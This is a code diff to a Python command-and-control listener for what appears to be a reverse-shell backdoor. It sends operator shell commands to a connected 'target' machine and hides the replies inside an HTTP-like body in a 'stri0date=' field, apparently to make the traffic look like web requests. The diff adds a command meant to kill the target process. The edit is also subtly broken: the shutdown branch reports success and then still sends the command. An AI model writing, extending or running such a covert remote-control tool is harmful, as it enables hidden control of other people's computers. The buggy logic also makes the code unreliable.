@@ -8,15 +8,22 @@ def connection(s):
     print('Waiting for connection......')
     ss, addr = s.accept()
     print('client %s is connection!' % (addr[0]))
-    print('print:\\!q for Disconnect')
+    print('print:\\!q for Disconnect  and  print:\\!shutdown for Kill the target process')
     while True:
-        cmd = input(str(addr[0]) + ':~#')
+        cmd = input(str(addr[0]) + ':#')
         if cmd == '\\!q':
             print('-- Disconnected --')
             exit(0)
+        elif cmd == '\\!shutdown':
+            print('Are you sure you\'re killing the target process? (Y/N)')
+            tmp_cmd = input('>')
+            if tmp_cmd.upper() == 'Y':
+                print("Terminated target process.\r\n已终止目标进程。")
+            else:
+                continue
         ss.send(encryption_res(cmd.encode()))
         data = ss.recv(4096)
-        print(decryption_res(data).decode(), end='')
+        print(decryption_req(data).decode(), end='')
 
 def encryption_res(data):
     # 可以采用任何加密或编码方式
@@ -38,7 +45,7 @@ def encryption_res(data):
     sendData += "%s" % data
     return sendData.encode()
 
-def decryption_res(data):
+def decryption_req(data):
     data = data.decode()
     data = data[data.find("\r\n\r\nstri0date=") + 14:]
     data = data[:data.find("\r\n\r\n")]
